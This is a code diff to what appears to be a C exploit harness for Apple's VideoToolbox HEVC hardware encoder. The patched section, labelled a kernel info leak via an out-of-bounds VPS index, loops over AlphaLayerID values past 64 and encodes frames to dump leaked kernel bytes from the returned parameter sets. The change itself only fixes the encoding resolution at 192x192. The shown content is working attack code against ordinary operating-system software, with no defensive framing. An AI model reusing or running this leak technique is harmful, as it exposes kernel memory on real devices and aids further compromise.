@@ -7243,8 +7243,9 @@ vps_cd_done:
         if (max_aid < 1) max_aid = 1;
         if (max_aid > 255) max_aid = 255;
 
+        int vw = 192, vh = 192;
         rlog("=== VPS_BYTE_DUMP: Kernel info leak via OOB VPS index ===\n");
-        rlog("AlphaLayerID range: 0-%d (OOB starts at 64)\n\n", max_aid);
+        rlog("AlphaLayerID range: 0-%d (OOB starts at 64), res=%dx%d\n\n", max_aid, vw, vh);
 
         /* First, get baseline VPS at AlphaLayerID=0 */
         uint8_t baseline_vps[512];
@@ -7257,7 +7258,7 @@ vps_cd_done:
                 CFSTR("EnableHardwareAcceleratedVideoEncoder"), kCFBooleanTrue);
             CFDictionarySetValue(enc_spec,
                 CFSTR("RequireHardwareAcceleratedVideoEncoder"), kCFBooleanTrue);
-            OSStatus st = VTCompressionSessionCreate(NULL, w, h,
+            OSStatus st = VTCompressionSessionCreate(NULL, vw, vh,
                 kCMVideoCodecType_HEVC, enc_spec, NULL, NULL, encode_cb, NULL, &s);
             CFRelease(enc_spec);
             if (st != noErr || !s) { rlog("FAIL: baseline session create\n"); goto done; }
@@ -7270,7 +7271,7 @@ vps_cd_done:
             st = VTCompressionSessionPrepareToEncodeFrames(s);
             if (st != noErr) { rlog("FAIL: baseline prepare=%d\n", (int)st); VTCompressionSessionInvalidate(s); CFRelease(s); goto done; }
             g_encode_done = 0;
-            encode_one(s, 0, w, h);
+            encode_one(s, 0, vw, vh);
             for (int ww = 0; ww < 300 && !g_encode_done; ww++) usleep(10000);
             if (g_saved_fmt) {
                 const uint8_t *ptr = NULL;
@@ -7314,7 +7315,7 @@ vps_cd_done:
                 CFSTR("EnableHardwareAcceleratedVideoEncoder"), kCFBooleanTrue);
             CFDictionarySetValue(enc_spec,
                 CFSTR("RequireHardwareAcceleratedVideoEncoder"), kCFBooleanTrue);
-            OSStatus st = VTCompressionSessionCreate(NULL, w, h,
+            OSStatus st = VTCompressionSessionCreate(NULL, vw, vh,
                 kCMVideoCodecType_HEVC, enc_spec, NULL, NULL, encode_cb, NULL, &s);
             CFRelease(enc_spec);
             if (st != noErr || !s) { rlog("AID=%d: session fail\n", aid); continue; }
@@ -7334,7 +7335,7 @@ vps_cd_done:
 
             if (g_saved_fmt) { CFRelease(g_saved_fmt); g_saved_fmt = NULL; }
             g_encode_done = 0;
-            encode_one(s, 0, w, h);
+            encode_one(s, 0, vw, vh);
             for (int ww = 0; ww < 300 && !g_encode_done; ww++) usleep(10000);
 
             rlog("AID=%3d: set=%d prepare=%d encode=%d psets=%zu",
